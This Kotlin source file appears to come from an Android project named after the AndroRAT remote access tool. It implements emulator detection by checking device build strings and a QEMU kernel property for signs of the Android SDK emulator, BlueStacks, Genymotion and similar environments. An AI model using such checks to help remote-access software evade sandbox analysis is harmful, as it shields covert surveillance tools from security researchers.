package com.ierusalem.androrat.core.emulator_detection

import android.os.Build

/**
 * An Object Class to detect if the user is running on an emulator
 *
 * Created by Andro on 06/04/2024.
 */
object EmulatorDetector {
    private var isRunningOnEmulator: Boolean? = null

    fun isRunningOnEmulator(): Boolean? {
        isRunningOnEmulator?.let {
            return it
        }

        // Android SDK emulator
        isRunningOnEmulator = runningOnAndroidStudioEmulator()
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MODEL.contains("VirtualBox")

                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("sdk_x86")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator")
                || Build.PRODUCT.contains("simulator")

                //bluestacks
                || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true) //bluestacks
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.HOST == "Build2" //MSI App Player
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || Build.PRODUCT == "google_sdk"
                // another Android SDK emulator check
                || System.getProperties().getProperty("ro.kernel.qemu") == "1"
        return isRunningOnEmulator
    }

    private fun runningOnAndroidStudioEmulator(): Boolean {
        return Build.FINGERPRINT.startsWith("google/sdk_gphone")
                && Build.FINGERPRINT.endsWith(":user/release-keys")
                && Build.MANUFACTURER == "Google" && Build.PRODUCT.startsWith("sdk_gphone") && Build.BRAND == "google"
                && Build.MODEL.startsWith("sdk_gphone")
    }
}